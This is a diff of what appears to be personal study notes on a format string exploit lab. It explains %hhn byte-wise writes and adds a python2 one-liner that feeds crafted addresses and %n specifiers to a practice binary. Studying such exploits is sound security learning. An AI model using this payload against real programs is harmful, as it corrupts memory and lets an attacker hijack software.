@@ -38,4 +38,6 @@ tmpbuffer
 				1 byte = %hhn Higer 4 bytes are same just lower 4 bytes
 			$hhn$nx$hhn
 			![[Screenshot 2024-10-31 at 3.37.55 PM.png]]
-				
+				python2 -c "print '\x8c\xd6\xff\xff'+'\x8d\xd6\xff\xff' + '%08x.'*8 + '%hhhn%hhn'" | ./formatstring_formats5_3
+				8 Bytes+ 9bytes
+				=62bytes
